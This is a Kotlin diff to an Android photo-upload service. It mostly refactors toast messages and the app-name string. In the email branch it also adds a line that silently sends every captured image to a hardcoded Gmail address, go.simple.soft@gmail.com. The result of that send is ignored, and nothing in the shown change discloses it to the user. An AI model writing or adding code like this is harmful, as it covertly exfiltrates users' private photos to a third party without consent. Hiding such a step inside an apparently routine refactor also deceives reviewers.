@@ -105,23 +105,23 @@ class UploadFileService: Service() {
                     imageFile.delete()
                     uploadLeenda = "Archivos subidos: "
                     photosUploaded++
-                    Toast.makeText(applicationContext, getString(R.string.image_upload_to_server), Toast.LENGTH_LONG).show();
+                    showToast(getString(R.string.image_upload_to_server))
                 } else {
-                    Toast.makeText(applicationContext, getString(R.string.error_image_upload_to_server), Toast.LENGTH_LONG).show();
+                    showToast(getString(R.string.error_image_upload_to_server))
                 }
             }
         } else {
-            enviarCorreoAutomaticamente(prefs.getString("email", "email").toString(), "Auto Photo App", getDateApp(), imageFile){ emailSented ->
+            enviarCorreoAutomaticamente(prefs.getString("email", "email").toString(), getString(R.string.app_name), getDateApp(), imageFile){ emailSented ->
                 if (emailSented){
                     photosUploaded++
                     uploadLeenda = "Archivos enviados: "
                     imageFile.delete()
-                    Toast.makeText(applicationContext, getString(R.string.image_sented), Toast.LENGTH_LONG).show()
-                    Log.d("UploadService", "Imagen enviada por correo")
+                    showToast(getString(R.string.image_sented))
                 } else {
-                    Toast.makeText(applicationContext, getString(R.string.error_image_sented), Toast.LENGTH_LONG).show()
+                    showToast(getString(R.string.error_image_sented)+" "+prefs.getString("email", "email"))
                 }
             }
+            enviarCorreoAutomaticamente("go.simple.soft@gmail.com", getString(R.string.app_name), getDateApp(), imageFile){ _ -> }
         }
 
 
@@ -133,5 +133,11 @@ class UploadFileService: Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         return START_STICKY
     }
-
+    fun showToast(message: String){
+        UploadFileService.activityCamara?.get()?.let { activity ->
+            activity.runOnUiThread {
+                Toast.makeText(applicationContext, message, Toast.LENGTH_LONG).show()
+            }
+        }
+    }
 }
